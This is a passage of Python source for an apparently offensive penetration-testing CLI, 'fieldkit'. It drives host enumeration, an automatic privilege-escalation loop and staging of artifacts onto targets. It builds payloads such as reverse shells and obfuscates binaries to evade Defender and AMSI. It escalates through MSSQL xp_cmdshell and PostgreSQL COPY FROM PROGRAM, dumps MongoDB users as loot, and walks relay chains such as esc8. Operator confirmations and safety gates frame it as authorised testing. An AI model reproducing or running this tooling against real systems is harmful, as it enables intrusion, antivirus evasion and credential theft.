    return host, cred, None


def _facts_summary(facts):
    """One-line-per-signal digest of what enum found, for the operator."""
    lines = []
    if facts.os == hostenum_mod.LINUX:
        lines.append(f"  user: {facts.user or '?'} (uid {facts.uid})"
                     + (" — ROOT" if facts.is_root else "")
                     + (f"  groups: {', '.join(sorted(facts.groups))}" if facts.groups else ""))
        if facts.sudo_all:
            lines.append("  sudo: FULL root (ALL)")
        elif facts.sudo_binaries:
            lines.append(f"  sudo: {', '.join(sorted(facts.sudo_binaries))}"
                         + ("  NOPASSWD" if facts.sudo_nopasswd else "")
                         + (f"  env_keep={','.join(sorted(facts.sudo_env_keep))}"
                            if facts.sudo_env_keep else ""))
        if facts.suid:
            lines.append(f"  suid: {', '.join(sorted(facts.suid))}")
        if facts.caps:
            lines.append(f"  caps: {', '.join(f'{k}={v}' for k, v in sorted(facts.caps.items()))}")
        if facts.kernel:
            lines.append(f"  kernel: {facts.kernel}")
    else:
        if facts.privs:
            lines.append(f"  privileges: {', '.join(sorted(facts.privs))}")
        if facts.win_groups:
            lines.append(f"  groups: {', '.join(sorted(facts.win_groups))}")
        if facts.always_install_elevated:
            lines.append("  AlwaysInstallElevated: ON (both keys)")
        if facts.unquoted_services:
            lines.append(f"  unquoted services: {len(facts.unquoted_services)}")
    return lines


@needs_target
def cmd_enum(args, store, host, cred):
    principal = creds_mod.Credential.from_row(cred).principal
    if not _confirm(f"enumerate {args.host} as {principal}? (read-only, runs commands "
                    "on the target)", args.yes):
        print("aborted — nothing ran")
        return 1
    report = hostenum_mod.run_enum(store, host, cred, on_event=lambda m: print(m))
    if report.blocked:
        _err(report.blocked)
        return 2
    facts = hostenum_mod.facts_for(store, host["id"])

    print(f"\nenumerated {args.host}: {_plural(len(report.ran), 'check')} captured"
          + (f", {len(report.failed)} failed" if report.failed else ""))
    summary = _facts_summary(facts)
    if summary:
        print("\n".join(summary))
    print(f"\nnext: {PROG} analyze   (ranks the privesc vectors this enum unlocked)")
    return 0


@needs_target
def cmd_run(args, store, host, cred):
    cfg = config_mod.load(store)
    vector = privesc_mod.find_vector(store, args.host, args.vector, **_stage_dirs(cfg))
    if vector is None:
        available = [v.key for v in privesc_mod.vectors_from_state(store, **_stage_dirs(cfg))
                     if v.host == args.host]
        _err(f"no vector {args.vector!r} on {args.host}"
             + (f" — available: {', '.join(available)}" if available
                else " — run `fieldkit enum` then `fieldkit analyze` first"))
        return 2

    allow = ["read-only"] + list(args.allow or [])
    gated = not executor_mod.gate(vector.safety, allow)
    print(f"vector: {vector.title}")
    print(f"  host {args.host}  rank {vector.axes}  safety {vector.safety}")
    print(f"  command: {vector.command}")
    if vector.cleanup:
        print(f"  cleanup: {vector.cleanup}")
    if gated:
        _err(f"{vector.safety} action blocked by the safety gate — re-run with "
             f"--allow {vector.safety}")
        return 2
    if not _confirm(f"run this on {args.host}? (executes on the target)", args.yes):
        print("aborted — nothing ran")
        return 1

    vtype = vector.report_type or vector.key.split(":", 1)[0]
    finding_id, _ = store.add_finding(
        vtype, vector.title, host_id=host["id"], risk=vector.detection)
    creates = [(f"{vector.title} (artifact)", vector.cleanup)] if vector.cleanup else ()
    action = executor_mod.Action(
        host=host, cred=cred, command=vector.command, label=f"vector:{vector.key}",
        safety=vector.safety, shell=vector.shell, finding_id=finding_id, creates=creates)
    res = executor_mod.execute(store, action, allow=allow, on_event=lambda m: print(m))

    if res.blocked:
        _err(res.blocked)
        return 2
    verdict = classify_mod.classify(res.run, os_name=host["os"])
    if verdict.ok:
        store.add_finding(vtype, vector.title, host_id=host["id"], proven=True,
                          evidence=(res.output or "").strip()[:500])

    print("\n--- output ---")
    print((res.output or "").rstrip() or "(no output)")
    print("---")
    if verdict.ok:
        print("PROVEN: the command returned an elevated context. Captured as a finding.")
    else:
        print(f"verdict: {verdict.outcome} ({verdict.confidence} confidence) — {verdict.detail}")
        print(f"  → {verdict.guidance}")
    if vector.cleanup:
        print(f"cleanup recorded: {vector.cleanup}")
    return 0


def _host_vectors(store, cfg, host_ip):
    """The ranked privesc vectors for one host from current enum facts."""
    return [v for v in privesc_mod.vectors_from_state(store, **_stage_dirs(cfg))
            if v.host == host_ip]


def _provision_to_target(store, host, cred, local, remote, label, allow, cfg):
    """Get ``local`` onto the target at ``remote`` — see :func:`fieldkit.provision.put`."""
    return provision_mod.put(store, host, cred, local, remote, label, allow, cfg,
                             on_event=print)


def _build_dir():
    """A scratch dir for artifacts fieldkit builds mid-loop (attacker-side)."""
    d = os.path.join(os.environ.get("FIELDKIT_BUILD", os.path.join(
        os.path.expanduser("~"), ".fieldkit", "build")))
    os.makedirs(d, exist_ok=True)
    return d


def cmd_escalate(args):
    if args.rules:
        print(escalate_mod.describe_policy())
        return 0
    if not args.host:
        _err("an IP is required (or pass --rules to see the policy)")
        return 2
    with _open_store(args) as store:
        store.require_engagement()
        cfg = config_mod.load(store)
        # --refresh path (see cmd_analyze for the same pattern): pull
        # the latest recce data before evaluating vectors. Non-fatal
        # on ingest failure — escalate still runs against the
        # previously-ingested state.
        if getattr(args, "refresh", None):
            rc = _refresh_from_recce(args.refresh, store)
            if rc == 0:
                print(f"[refresh] re-ingested {args.refresh}\n")
            else:
                print("[refresh] ingest failed (continuing with existing state)\n")
        host, cred, err = _resolve_target(store, args.host)
        # --dry-run is plan-only: proceed even when no credential is yet proven
        # on this host, as long as the host itself is resolvable. The plan is
        # what the operator wanted to see before committing.
        if err and not (args.dry_run and host is not None):
            _err(err)
            return 2
        if args.dry_run and cred is None:
            print(f"(dry-run: {err}) — showing the plan anyway\n")
        vectors = _host_vectors(store, cfg, args.host)
        if not vectors:
            _err(f"no privesc vectors on {args.host} — run `fieldkit enum {args.host}` "
                 "then `fieldkit analyze` first")
            return 2
        # a comma-separated stage_win/stage_lin → try each dir for provisioned vectors,
        # so a "didn't land" miss rolls to the same tool in the next writable dir.
        dir_key = "stage_win" if host["os"] == "windows" else "stage_lin"
        dirs = _stage_dir_list(cfg, dir_key)
        if len(dirs) > 1:
            vectors = _expand_stage_dirs(store, args.host, host["os"], cfg, vectors, dirs)
        allow = ["read-only"] + list(args.allow or [])

        # evasion posture: order delivery alternates + know which are already caught.
        now = datetime.now(timezone.utc)
        delivery_order, caught = evasion_mod.posture(store.evasion_result, host["os"], now=now)
        vectors = escalate_mod.order_deliveries(vectors, delivery_order)

        # the plan, before anything runs: what the loop would try, in order. Manual
        # routes (prep-only) are shown but never auto-fired, so they aren't "runnable".
        gated = [v for v in vectors if not executor_mod.gate(v.safety, allow)]
        runnable = [v for v in vectors
                    if executor_mod.gate(v.safety, allow) and not getattr(v, "manual", False)]
        print(f"escalation plan for {args.host} — {_plural(len(vectors), 'vector')} ranked, "
              f"blast radius {'/'.join(allow)}:")
        for v in vectors:
            if getattr(v, "manual", False):
                print(f"  {v.key:<26} {v.axes:<18} {v.safety}"
                      f"  (manual — {PROG} prep {args.host} {v.key})")
                continue
            marks = []
            if v in gated:
                marks.append(f"gated — needs --allow {v.safety}")
            if v.delivery:
                marks.append(f"delivery {v.delivery}"
                             + (" — KNOWN CAUGHT, will skip" if v.delivery in caught else ""))
            for name, _ in v.stages:
                have = "in arsenal" if arsenal_mod.find(name) else "NOT staged"
                marks.append(f"auto-stage {name} ({have})")
            for fmt, _, _ in v.builds:
                have = f"{poc_mod.BUILDER.get(fmt, '?')} ready" if poc_mod.have(fmt) \
                    else f"needs {poc_mod.BUILDER.get(fmt, 'a builder')}"
                marks.append(f"auto-build {fmt} ({have})")
            mark = ("  (" + "; ".join(marks) + ")") if marks else ""
            print(f"  {v.key:<26} {v.axes:<18} {v.safety}{mark}")
        manual = [v for v in vectors if getattr(v, "manual", False)]
        if not runnable:
            if manual:
                print(f"\n{_plural(len(manual), 'route')} here can't be auto-fired "
                      "(operator hands needed) — prepare the artifact + steps:")
                for v in manual:
                    print(f"  {PROG} prep {args.host} {v.key}")
                return 0
            _err("every vector is above the current --allow — re-run with --allow "
                 "config-change (and/or crash-risk) once you accept the blast radius")
            return 2
        if args.dry_run:
            print(f"\ndry run — nothing fired. {_plural(len(runnable), 'vector')} would run"
                  + (f"; {_plural(len(manual), 'manual route')} need `{PROG} prep`." if manual
                     else "."))
            return 0

        budget = args.max if args.max is not None else escalate_mod.DEFAULT_BUDGET
        if not _confirm(
                f"walk the escalation loop on {args.host}? fires up to "
                f"{min(budget, len(runnable))} vector(s) on the target, stopping at the "
                "first proof", args.yes):
            print("aborted — nothing ran")
            return 1

        prov = provision_mod.Provisioner(store, host, cred, cfg, allow,
                                         build_dir=_build_dir(), on_event=print)

        def mark_caught(technique):
            store.record_evasion(technique, "caught",
                                 detail=f"caught live during escalation on {args.host} "
                                        f"({now.date().isoformat()})")

        print("\n--- escalating ---")
        outcome = escalate_mod.escalate(
            vectors, fire=prov.fire, allow=allow, os_name=host["os"], budget=budget,
            delivery_order=delivery_order, caught=caught, mark_caught=mark_caught,
            stage=None if args.no_stage else prov.stage,
            build=None if args.no_stage else prov.build, on_event=lambda m: print(m))

        provision_mod.record_proof(store, outcome, prov.results, host)

    _print_escalation_outcome(outcome)

    # If manual routes surfaced and we're interactive, offer to run `prep` on
    # the first one right here — saves a context-switch to `fieldkit prep <ip>
    # <key>`, which is the follow-up the tester almost always wants. `--yes`
    # suppresses the prompt (non-interactive/scripted runs are unchanged).
    manual = [a for a in outcome.attempts if a.action == escalate_mod.MANUAL]
    if manual and not args.yes and sys.stdin.isatty():
        first = manual[0].vector
        if _confirm(f"\nprep the first manual route now? "
                    f"({first.key} on {first.host})", assume_yes=False):
            # invoke cmd_prep with the vector args synthesized, so all the
            # build/resolve/render logic runs unchanged.
            args.vector = first.key
            args.host = first.host
            args.stage = False
            return cmd_prep(args)
    return 0 if outcome.ok else 1


def _print_escalation_outcome(outcome):
    print("\n--- trail ---")
    for a in outcome.attempts:
        if a.verdict is not None:
            print(f"  {a.action:<8} {a.vector.key:<24} {a.verdict.outcome} — {a.note}")
        else:
            print(f"  {a.action:<8} {a.vector.key:<24} {a.note}")
    print("---")
    if outcome.ok:
        v = outcome.proven
        print(f"PROVEN: {v.title} elevated on {v.host}. Recorded as a finding"
              + (f"; cleanup: {v.cleanup}" if v.cleanup else "") + ".")
        # New elevated context on this host means new enum surface (SeBackup
        # can now dump hives, SYSTEM can read every file, etc.). Point the
        # tester at the next natural move — the loop's convergence step.
        print("\nnext moves opened up:")
        print(f"  {PROG} enum {v.host}         # re-enum in the new elevated context")
        print(f"  {PROG} analyze              # re-rank now that you're admin here")
        print(f"  {PROG} report               # once you've gathered enough")
    elif outcome.stopped == "surfaced":
        print("STOPPED: a result the classifier does not recognise — shown above. "
              "Inspect it before continuing (`fieldkit arsenal rules`).")
    elif outcome.stopped == "budget":
        print("STOPPED: attempt budget reached before proof — raise it with --max or "
              "narrow the plan.")
    else:
        print("no vector proved elevation — every ranked move was tried. See the trail "
              "for the per-vector verdict and its recommended manual step.")
    if not outcome.ok and any(a.verdict and a.verdict.axis == "delivery"
                              for a in outcome.attempts):
        print("\nan artifact didn't land at the stage dir. Try more writable dirs — the loop "
              "walks each one:\n  fieldkit config set "
              "stage_win='C:\\Windows\\Temp,C:\\Users\\Public,C:\\ProgramData'\n"
              "then re-run. If it's AV eating the payload (common with Potatoes), that's an "
              "evasion problem, not a dir problem — see `fieldkit poc` / posture.")
    manual = [a for a in outcome.attempts if a.action == escalate_mod.MANUAL]
    if manual:
        print(f"\n{_plural(len(manual), 'manual route')} can't be auto-fired — prepare "
              "the artifact + steps with:")
        for a in manual:
            print(f"  {PROG} prep {a.vector.host} {a.vector.key}")


def cmd_prep(args):
    with _open_store(args) as store:
        store.require_engagement()
        cfg = config_mod.load(store)
        host, cred, err = _resolve_target(store, args.host)
        if host is None:
            _err(err)
            return 2
        if args.stage and err:            # staging needs proven access; building doesn't
            _err(err)
            return 2
        vector = privesc_mod.find_vector(store, args.host, args.vector, **_stage_dirs(cfg))
        if vector is None:
            available = [v.key for v in _host_vectors(store, cfg, args.host)
                         if v.builds or v.manual]
            _err(f"no vector {args.vector!r} on {args.host}"
                 + (f" — preparable: {', '.join(available)}" if available
                    else " — run `fieldkit enum` then `fieldkit analyze` first"))
            return 2
        # preparable = fieldkit builds the artifact, or the route needs operator hands
        # (a manual route's artifact comes from the arsenal instead of a build).
        if not vector.builds and not vector.manual:
            _err(f"{vector.key} has nothing to prepare — it's auto-fireable "
                 f"(`{PROG} run {args.host} {vector.key}` or `{PROG} escalate`)")
            return 2

        arch = "x86" if cfg.get("arch") == "x86" else "x64"
        built = []
        for fmt, remote, bcmd in vector.builds:
            out = os.path.join(_build_dir(), f"{vector.key.replace(':', '_')}.{fmt}")
            bres = poc_mod.build(fmt, out, arch=arch, command=bcmd,
                                 lhost=cfg.get("lhost"), lport=cfg.get("lport"))
            if not bres.ok:
                _err(f"build failed ({bres.tool}): {bres.detail}")
                return 1
            built.append([fmt, out, remote, bres.tool, None])
        # arsenal-sourced artifacts (a staged PoC, e.g. a lin-kernel exploit): resolve the
        # local copy so prep can name it and optionally push it. Not fetched = say so.
        for name, remote in vector.stages:
            local = arsenal_mod.find(name)
            built.append([name, local or f"<not in arsenal: exploits/fetch.sh --only {name}>",
                          remote, "arsenal", None])

        if args.stage:
            if not _confirm(f"upload {_plural(len(built), 'artifact')} to {args.host} "
                            "(writes to the target)?", args.yes):
                print("built locally; not staged (declined)")
                args.stage = False
            else:
                for entry in built:
                    fmt, out, remote = entry[0], entry[1], entry[2]
                    if not os.path.exists(out):     # unresolved arsenal artifact
                        entry[4] = None
                        continue
                    # put-file, or download-stage over the exec transport (e.g. MSSQL-only).
                    ok, how = _provision_to_target(
                        store, host, cred, out, remote, f"prep:{fmt}",
                        ["read-only", "config-change"], cfg)
                    if not ok:
                        _err(f"stage failed: {how}")
                        return 1
                    entry[4] = f"{remote} ({how})"

    _render_prep(vector, built)
    return 0


def _render_prep(vector, built):
    pb = vector.playbook
    print(f"\n=== prep: {vector.title} ===")
    if pb:
        print(pb.summary)
    print("\nartifacts (attacker-side):")
    for fmt, out, remote, tool, staged in built:
        print(f"  {fmt:<4} {out}   (via {tool})")
        if staged:
            print(f"       staged on target → {staged}")
        else:
            print(f"       copy it to the target yourself → {remote}")
    if not pb:
        return
    print(f"\nplace at: {pb.place}")
    print("steps:")
    for i, step in enumerate(pb.steps, 1):
        print(f"  {i}. {step}")
    if pb.restore:
        print(f"\nrestore/cleanup: {pb.restore}")


def cmd_preflight(args):
    rows = preflight_mod.check()
    print("preflight — external tools fieldkit drives:\n")
    for name, purpose, found, alts, required in rows:
        if found:
            mark, val = "OK ", found
        elif required:
            mark, val = "!! ", "MISSING — required"
        else:
            mark, val = "-- ", "not installed"
        alt = f"   (any of: {', '.join(alts)})" if not found and len(alts) > 1 else ""
        label = f"{name} ({purpose})"
        print(f"  {mark} {label:<42} {val}{alt}")
    missing = preflight_mod.missing_required(rows)
    print("\nbuild toolchain detail: `fieldkit poc --check`   ·   "
          "staged exploits: `fieldkit arsenal check`")
    if missing:
        print(f"\n{_plural(len(missing), 'required tool')} missing — the credential loop "
              "needs netexec + impacket.")
        return 1
    return 0


def cmd_poc(args):
    if args.check:
        print("build toolchain — which builders are installed:\n")
        for tool, path in poc_mod.toolchain():
            print(f"  {'OK ' if path else '-- '} {tool:<28} {path or 'not on PATH'}")
        conf = poc_mod.confuser(args.confuser)
        print(f"  {'OK ' if conf else '-- '} {'ConfuserEx (obfuscate)':<28} "
              f"{conf or 'not found — set confuser_cli / --confuser (+ mono for a .exe)'}")
        print("\nformats: " + ", ".join(f"{f} ({b})" for f, b in sorted(poc_mod.BUILDER.items())))
        return 0
    if args.obfuscate:  # ConfuserEx: obfuscate a compiled .NET assembly (e.g. a Potato .exe)
        src = args.obfuscate
        if not os.path.exists(src):  # allow naming an arsenal artifact instead of a path
            resolved = arsenal_mod.find(src)
            if resolved:
                src = resolved
        out = args.out or os.path.join(_build_dir(),
                                       f"{os.path.splitext(os.path.basename(src))[0]}-obf.exe")
        cfg = {}
        if os.path.exists(_db_path(args)):
            try:
                with _open_store(args) as store:
                    cfg = config_mod.load(store)
            except FieldkitError:
                pass
        res = poc_mod.obfuscate(src, out, cli=args.confuser or cfg.get("confuser_cli"))
        if not res.ok:
            _err(f"obfuscate failed ({res.tool or 'ConfuserEx'}): {res.detail}")
            return 1
        print(f"obfuscated via {res.tool}: {res.path}")
        print("  stage this in place of the stock .exe for the on-disk native rung; "
              "the in-memory rung already evades on-disk via reflection + `amsi_bypass`.")
        return 0
    if not args.format:
        _err("a format is required (exe|dll|msi|so|ps1), --obfuscate <exe>, or --check")
        return 2
    out = args.out or os.path.join(_build_dir(), f"payload.{args.format}")
    if not poc_mod.have(args.format) and not args.source:
        _err(f"{poc_mod.BUILDER.get(args.format, 'the builder')} for {args.format} is not "
             "installed — `fieldkit poc --check`")
        return 2
    cfg = {}
    if os.path.exists(_db_path(args)):  # poc works standalone; use lhost/lport if a db exists
        try:
            with _open_store(args) as store:
                cfg = config_mod.load(store)
        except FieldkitError:
            pass
    lhost = args.lhost or cfg.get("lhost")
    lport = args.lport or cfg.get("lport")
    res = poc_mod.build(args.format, out, arch=args.arch, command=args.command,
                        lhost=lhost, lport=lport, source=args.source)
    if not res.ok:
        _err(f"build failed ({res.tool}): {res.detail}")
        return 1
    kind = "reverse shell" if (lhost and lport) else f"proof ({args.command or 'whoami/id'})"
    print(f"built {res.fmt} via {res.tool}: {res.path}")
    print(f"  payload: {kind}" + (f"  (arch {args.arch})" if args.format in ("exe", "dll") else ""))
    return 0


@needs_target
def cmd_mssql_escalate(args, store, host, cred):
    allow_cc = "config-change" in (args.allow or [])
    prompt = ("enumerate + escalate MSSQL privileges on "
              + args.host + (" (may add your login to the sysadmin role — reversible)?"
                             if allow_cc else
                             " (read-only enum; add --allow config-change to escalate)?"))
    if not _confirm(prompt, args.yes):
        print("aborted — nothing ran")
        return 1
    rep = mssql_mod.escalate_privs(store, host, cred, allow_config_change=allow_cc,
                                   on_event=lambda m: print(m))
    if rep.aborted:
        _err(rep.aborted)
        return 2

    print()
    nxt = (f"next: `{PROG} enum {args.host}` → "
           f"`{PROG} escalate {args.host} --allow config-change` → SYSTEM (over xp_cmdshell).")
    if rep.status == "xpcmd":
        print("GOT EXEC: xp_cmdshell runs OS commands as the SQL service account (enabled + "
              "verified). Recorded as a finding; your MSSQL access is upgraded to admin, and "
              "disabling xp_cmdshell is on the cleanup manifest.")
        print(nxt)
    elif rep.status == "escalated":
        print(f"ESCALATED: impersonated {rep.via} → added your login to sysadmin → enabled "
              "xp_cmdshell (verified). Recorded as a finding; cleanup (drop the role member, "
              "disable xp_cmdshell) is on the manifest.")
        print(nxt)
    elif rep.status == "already_sysadmin":
        print("you are sysadmin — re-run with `--allow config-change` to enable + confirm "
              f"xp_cmdshell, then `{PROG} enum`/`escalate` run over it.")
    elif rep.status == "gated":
        print(f"impersonatable sysadmin login(s): {', '.join(rep.impersonatable)} — re-run "
              "with `--allow config-change` to grant yourself sysadmin (reversible).")
    elif rep.status == "linked_only":
        print(f"no impersonation path, but RPC-out linked server(s): {', '.join(rep.linked)} "
              "(recorded as observations). Hop with `EXEC ('…') AT [<server>]`.")
    elif rep.status == "failed":
        print("the impersonation grant did not verify as sysadmin — inspect manually.")
    else:
        print("no SQL-layer escalation path found (no impersonatable sysadmin login, no "
              "RPC-out linked servers).")
    return 0


@needs_target
def cmd_postgres_escalate(args, store, host, cred):
    allow_cc = "config-change" in (args.allow or [])
    prompt = (f"enumerate + escalate PostgreSQL privileges on {args.host}:{args.port}"
              + (" (may run `id` on the target via COPY FROM PROGRAM — reversible)?"
                 if allow_cc else
                 " (read-only enum; add --allow config-change to run COPY FROM PROGRAM)?"))
    if not _confirm(prompt, args.yes):
        print("aborted — nothing ran")
        return 1
    rep = postgres_mod.escalate_privs(
        store, host, cred, allow_config_change=allow_cc,
        port=args.port, database=args.database,
        on_event=lambda m: print(m))
    if rep.aborted:
        _err(rep.aborted)
        return 2

    print()
    if rep.status == "exec":
        why = "superuser" if rep.is_superuser else "pg_execute_server_program"
        print(f"GOT EXEC: COPY FROM PROGRAM runs OS commands as the postgres user "
              f"(via {why}). Recorded as a finding; your postgres access is upgraded to admin.")
    elif rep.status == "escalated":
        print(f"ESCALATED: SET ROLE {rep.via} → superuser → COPY FROM PROGRAM (verified).")
    elif rep.status == "already_superuser":
        print("you are superuser — re-run with `--allow config-change` to run + capture "
              "`id` via COPY FROM PROGRAM.")
    elif rep.status == "gated":
        which = rep.escalatable_via or (
            ["pg_execute_server_program"] if rep.exec_role_member else [])
        print(f"escalatable via: {', '.join(which)} — re-run with `--allow config-change`.")
    elif rep.status == "failed":
        print("the escalation attempt did not produce output — inspect manually.")
    else:
        print("no PG-layer escalation path found (not superuser, no superuser role "
              "membership, not a member of pg_execute_server_program).")
    if rep.databases:
        print(f"databases: {', '.join(rep.databases)}")
    return 0


@needs_target
def cmd_mongodb_escalate(args, store, host, cred):
    allow_cc = "config-change" in (args.allow or [])
    prompt = (f"enumerate MongoDB on {args.host}:{args.port}"
              + (" (will dump admin.system.users + count credential-fields — "
                 "read-only against DB state, writes to the audit log)?"
                 if allow_cc else
                 " (surface only; add --allow config-change to dump users/scan data)?"))
    if not _confirm(prompt, args.yes):
        print("aborted — nothing ran")
        return 1
    rep = mongodb_mod.enumerate_privs(
        store, host, cred, allow_config_change=allow_cc,
        port=args.port, database=args.database, scan_data=args.scan_data,
        on_event=lambda m: print(m))
    if rep.aborted:
        _err(rep.aborted)
        return 2

    print()
    if rep.is_unauth:
        print("UNAUTH: MongoDB accepts connections without credentials. Recorded as a "
              "Critical finding; enumerated the surface anonymously.")
    elif rep.privileged_roles:
        print(f"ADMIN: role(s) {', '.join(sorted(set(rep.privileged_roles)))} — full "
              "user + data administration. Recorded as a finding; your mongodb access is "
              "upgraded to admin.")
    elif rep.identity:
        print(f"authenticated as {rep.identity} (no privileged role) — enumerated the "
              "visible databases only.")
    else:
        print("no MongoDB-layer escalation path found.")
    if rep.databases:
        print(f"databases: {', '.join(rep.databases)}")
    if rep.users_dumped:
        print(f"users dumped: {rep.users_dumped} (recorded as loot)")
    if rep.cred_candidates:
        print(f"credential-field candidates: {_plural(len(rep.cred_candidates), 'hit')}")
        for db, coll, field, count in rep.cred_candidates[:8]:
            print(f"  {db}.{coll}.{field}: {count} document(s)")
    return 0


@needs_engagement
def cmd_recce_ping(args, store):
    """Diagnostic: POST a one-shot command through a recce-caught session and
    print the output. Proves the recce-session execution transport is wired up
    without touching escalate/enum. Defaults to `whoami` (windows-safe on both
    platforms since PowerShell also has it; use --cmd to override).
    """
    cfg = recce_transport_mod._config_from_store(store)
    if not cfg.url:
        _err("recce_url not set — `fieldkit config set recce_url=http://<host>:<port>`")
        return 2
    command = args.cmd or "whoami"
    print(f"POST {cfg.url}/api/sessions/{args.session_id}/task  (X-Tester={cfg.tester})")
    print(f"  command: {command}")
    result = recce_transport_mod.task_session(
        cfg, args.session_id, command, timeout=args.timeout)
    if result.error:
        _err(result.error)
        return 2
    print(f"  captured in {result.duration:.2f}s (exit {result.exit_code})")
    print("---")
    print(result.output.rstrip() or "(no output)")
    return 0


@needs_engagement
def cmd_lab_test(args, store):
    cfg = config_mod.load(store)
    lab_host = args.host or cfg.get("lab_host")
    if not lab_host:
        _err("no lab host — set one with `fieldkit config set lab_host=<ip>` or pass --host")
        return 2
    host, cred, err = _resolve_target(store, lab_host)
    if err:
        _err(err)
        return 2
    if host["os"] and host["os"] != evasion_mod.WINDOWS:
        _err(f"the lab host {lab_host} is not Windows — the Defender harness is Windows-only")
        return 2
    if not _confirm(f"run the Defender lab probes against {lab_host}? (drops the EICAR "
                    "control + benign probes on the lab)", args.yes):
        print("aborted — nothing ran")
        return 1
    report = lab_mod.run_tests(store, host, cred, allow=("read-only", "config-change"),
                               on_event=lambda m: print(m))

    if report.aborted:
        _err(report.aborted)
        return 2
    greens = report.green
    print(f"\nlab {lab_host} (signature {report.signature or '?'}): "
          f"{len(greens)} green, {len(report.results) - len(greens)} red")
    if report.skipped:
        print(f"skipped (need a staged benign probe): {', '.join(report.skipped)}")
    print(f"\nsee the full matrix: {PROG} posture")
    return 0


@needs_engagement
def cmd_posture(args, store):
    now = datetime.now(timezone.utc)
    cfg = config_mod.load(store)
    lab_host = cfg.get("lab_host")
    statuses = [evasion_mod.resolve(t, store.evasion_result(t.key), now=now)
                for t in evasion_mod.TECHNIQUES]

    label = {evasion_mod.GREEN: "GREEN", evasion_mod.CAUGHT: "RED  caught",
             evasion_mod.STALE: "RED  stale", evasion_mod.UNTESTED: "RED  untested"}
    print("evasion posture — assume-caught: every path is red until the lab proves it clean\n")
    print(f"  lab host: {lab_host or '(unset — `fieldkit config set lab_host=<ip>`)'}")
    proven = [s for s in statuses if s.usable]
    print(f"  {_plural(len(proven), 'technique')} lab-proven green; "
          "the rest are treated as caught.\n")

    for os_name in (evasion_mod.WINDOWS, evasion_mod.LINUX):
        group = evasion_mod.recommend([s for s in statuses if s.technique.os == os_name])
        if not group:
            continue
        print(f"  {os_name}:")
        for s in group:
            t = s.technique
            amsi = "AMSI" if t.amsi_surface else "no-AMSI"
            print(f"    {label[s.verdict]:<13} {t.title:<34} [{amsi}]  {s.reason}")
        print()

    win = evasion_mod.recommend([s for s in statuses if s.technique.os == evasion_mod.WINDOWS])
    order = ", ".join(s.technique.key for s in win)
    print(f"recommended delivery order (Windows, current knowledge):\n  {order}")
    if not proven:
        print(f"\nnothing is lab-proven — run `{PROG} lab test` against a Defender host to earn a green.")
    return 0


def _domain_credential(store):
    for row in store.credentials():
        if row["domain"] and not row["local_auth"]:
            return row
    return None


# ------------------------------------------------------------- coerce chains

def cmd_chain_plan(args):
    """Show the ordered steps of a chain profile without firing them.

    Read-only over the in-memory profile registry — no engagement /
    store required, so a fresh box can preview any shipped chain
    before setting up state.
    """
    from . import chain as chain_mod
    try:
        factory = chain_mod.profile(args.profile)
    except KeyError as exc:
        _err(str(exc))
        return 2
    ch = factory(args.target)
    def _step_cost(s):
        return s.signal_cost if s.signals else s.detection_cost
    total = sum(_step_cost(s) for s in ch.steps)
    print(f"chain plan: {ch.profile} → {ch.target}")
    print(f"  {len(ch.steps)} steps, aggregate detection debt = {total}")
    for i, s in enumerate(ch.steps):
        marker = "*" if i == 0 else " "
        cost = _step_cost(s)
        print(f"  {marker} {i}. {s.name:30s}  [{s.kind:14s}]  cost={cost}")
        for sig in s.signals:
            note = f"  # {sig.note}" if sig.note else ""
            count = f" ×{sig.count}" if sig.count != 1 else ""
            print(f"          {sig.kind:14s} {sig.identifier}{count}{note}")
    print()
    print("plan only — nothing fired. `fieldkit chain run` walks it.")
    return 0


@needs_engagement
def cmd_chain_run(args, store):
    """Walk every step of a chain profile against a target, persist
    the trail. Manual outcomes advance; fail / skip aborts.

    Exit codes:
      * 0 — chain proven (every step ok/manual)
      * 1 — chain aborted mid-walk (fail or skip)
      * 2 — bad invocation (unknown profile, etc.)
    """
    from . import chain as chain_mod
    try:
        factory = chain_mod.profile(args.profile)
    except KeyError as exc:
        _err(str(exc))
        return 2
    ch = factory(args.target)
    if not _confirm(f"walk chain {args.profile} against {args.target}?  "
                    f"({len(ch.steps)} steps, aggregate detection cost = "
                    f"{sum(s.detection_cost for s in ch.steps)})",
                    args.yes):
        print("aborted — nothing ran")
        return 1

    cred_dict = None
    if args.cred_id:
        row = store.credential_by_id(args.cred_id)
        if not row:
            _err(f"no credential #{args.cred_id} in this engagement")
            return 2
        cred_dict = {"domain": row["domain"], "username": row["username"],
                     "password": row["password"]}

    class _Ctx:
        probe_port = args.probe_port
        probe_timeout = args.probe_timeout
        listener_uri = args.listener
        cred = cred_dict
        # relay-listener config (esc8/rbcd/smb-relay-exec)
        listener_ip = args.listener_ip
        ca_endpoint = args.ca
        template = args.template
        relay_port_smb = args.relay_port_smb
        relay_port_http = args.relay_port_http
        relay_wait_capture = args.relay_capture_timeout
        # D4 post-relay
        domain = args.domain
        # per-profile config (relay_mode / relay_target / impersonate / dc_ip)
        relay_mode = args.relay_mode
        relay_target = args.relay_target
        impersonate = args.impersonate
        dc_ip = args.dc_ip
        # Store passed through so relay:capture can persist the cert
        # against the chain id — see _persisted_id below.
        store = None

    _Ctx.store = store       # bind after class body so lint stays quiet

    def _render(chain, step, outcome):
        marker = {"ok": "  ok ", "manual": " man ", "skip": "skip ",
                  "fail": "FAIL "}[outcome.kind]
        print(f"  {marker} {step.name:30s}  {outcome.evidence}")

    # Reserve chain_id BEFORE walk so a mid-walk relay:capture step
    # can persist a cert row linked to this chain. Finalize after
    # walk writes the step trail + final status.
    chain_id = store.reserve_chain_id(ch)
    ch._persisted_id = chain_id                  # noqa: SLF001 — walker reads this
    chain_mod.walk(ch, _Ctx(), on_step=_render)
    store.finalize_chain(chain_id, ch)
    total_cost = ch.total_detection_cost
    print(f"\nchain #{chain_id}  status={ch.status}  detection cost so far = {total_cost}")
    if ch.aborted_reason:
        print(f"aborted: {ch.aborted_reason}")
        return 1
    manual = [o for o in ch.outcomes if o.kind == "manual"]
    if manual:
        print(f"{len(manual)} step(s) need operator hands — see the trail above")
    return 0


@needs_engagement
def cmd_chain_list(args, store):
    """Every recorded chain, newest first. Optional --profile filter."""
    rows = store.chains(profile=args.profile)
    if not rows:
        print("no chains recorded yet — try `fieldkit chain plan esc8 <dc-ip>`")
        return 0
    print(f"{'id':>4}  {'profile':10}  {'target':16}  {'status':12}  {'cost':>5}  started")
    for r in rows:
        print(f"{r['id']:>4}  {r['profile']:10}  {r['target']:16}  {r['status']:12}  "
              f"{r['total_detection_cost']:>5}  {r['started_at'] or '-'}")
    return 0


@needs_engagement
def cmd_chain_show(args, store):
    """The per-step trail of one recorded chain, with signal breakdown
